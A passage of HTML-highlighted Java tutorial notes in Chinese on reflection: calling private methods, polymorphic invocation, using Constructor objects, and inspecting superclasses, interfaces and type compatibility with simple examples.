&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>同上一个三级标题对于private字段的处理，我们可以用&lt;code>Method.setAccessible(true)&lt;/code>，也存在同样可能失败的原因，不重复了&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>对于参数不同的方法 我们可以指定参数类型和数量，而对于多态，仍表现出多态的原则，即 总是调用实际类型的覆写方法（如果存在&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/** 相当于
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Person p = new Student();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> p.hello(); */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Person:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 继承自Person 覆写hello方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Student:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="调用构造方法">调用构造方法&lt;/h3>
&lt;ul>
&lt;li>正常的new会触发构造方法，通过class的new会有局限性（见上），为了调用任意的构造方法，我们可以使用反射的Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例；Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取某个public的Constructor
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取构造方法Integer(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用构造方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取构造方法Integer(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;456&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>注意&lt;code>Constructor&lt;/code>总是当前类定义的构造方法，和父类无关，因此不存在多态的问题&lt;/li>
&lt;li>同上面，可以有&lt;code>setAccessible(true)&lt;/code>来调用非public的Constructor&lt;/li>
&lt;/ul>
&lt;h3 id="获取继承关系">获取继承关系&lt;/h3>
&lt;ul>
&lt;li>最开始的三级标题Class中提到了三种方式获取Class实例，他们都是同一个实例，因为JVM对每个加载的&lt;code>Class&lt;/code>只创建一个&lt;code>Class&lt;/code>实例来表示它的类型&lt;/li>
&lt;li>获取父类Class&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>获取接口，&lt;code>getInterfaces&lt;/code>只返回当前类直接实现的接口类型，不包括父类；如果一个类没有实现任何&lt;code>interface&lt;/code>，那么&lt;code>getInterfaces&lt;/code>返回空数组&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInterfaces&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当我们判断一个实例是否是某个类型时，正常情况下使用&lt;code>instanceof&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isDouble&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Double&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isInteger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isNumber&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isSerializable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果是两个&lt;code>Class&lt;/code>实例，要判断一个向上转型是否成立，可以调用&lt;code>isAssignableFrom()&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Integer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Number n = ?
